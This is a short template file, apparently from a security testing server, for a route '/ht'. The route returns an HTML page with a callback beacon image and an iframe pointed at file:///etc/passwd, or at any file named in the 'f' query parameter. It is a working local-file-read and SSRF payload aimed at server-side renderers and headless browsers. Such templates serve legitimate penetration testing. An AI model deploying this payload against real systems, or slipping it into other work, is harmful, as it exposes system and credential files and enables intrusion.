---
title: HTML IFrame With Request Params
description: Returns an HTML page with an iframe src to f query parameter
weight: 1
pattern: /ht$
is_final: true
data:
  headers:
    Content-Type: text/html
  body: |
    {{- $file := "file:///etc/passwd" }}
    {{- if .Request.GetParams.f }}
    {{- $file = (index .Request.GetParams.f 0) }} 
    {{- end -}}
    <html>
    <body>
    <img src="/{{.NotifyString}}/static-lh" />
    <iframe src="{{ $file }}" height="500"></iframe>
    </body>
    </html>
---

### /ht

attempts to get whatever files is supplied via the `f` query parameter
